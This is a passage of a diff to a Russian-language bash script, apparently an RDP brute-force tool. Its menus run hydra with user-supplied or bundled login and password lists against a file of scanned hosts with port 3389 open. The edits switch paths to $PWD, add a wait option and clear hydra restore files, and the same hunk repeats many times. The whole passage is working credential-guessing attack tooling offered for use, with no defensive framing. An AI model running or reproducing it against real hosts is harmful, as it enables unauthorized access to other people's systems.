+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4384,7 +4612,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4413,6 +4641,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4424,7 +4656,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4434,7 +4666,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4444,7 +4676,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4453,7 +4685,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4482,6 +4714,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4493,7 +4729,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4503,7 +4739,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4513,7 +4749,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4522,7 +4758,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4551,6 +4787,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4562,7 +4802,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4572,7 +4812,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4582,7 +4822,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4591,7 +4831,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4620,6 +4860,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4631,7 +4875,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4641,7 +4885,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4651,7 +4895,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4660,7 +4904,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4689,6 +4933,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4700,7 +4948,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4710,7 +4958,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4720,7 +4968,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4729,7 +4977,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4757,6 +5005,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4768,7 +5020,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4778,7 +5030,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4788,7 +5040,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4797,7 +5049,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4826,6 +5078,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4837,7 +5093,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4847,7 +5103,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4857,7 +5113,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4866,7 +5122,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4895,6 +5151,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4906,7 +5166,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4916,7 +5176,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4926,7 +5186,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4935,7 +5195,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4964,6 +5224,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4975,7 +5239,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4985,7 +5249,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4995,7 +5259,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5004,7 +5268,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5033,6 +5297,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5044,7 +5312,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5054,7 +5322,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5064,7 +5332,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5073,7 +5341,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5102,6 +5370,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5113,7 +5385,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5123,7 +5395,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5133,7 +5405,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5142,7 +5414,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5171,6 +5443,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5182,7 +5458,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5192,7 +5468,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5202,7 +5478,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5211,7 +5487,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
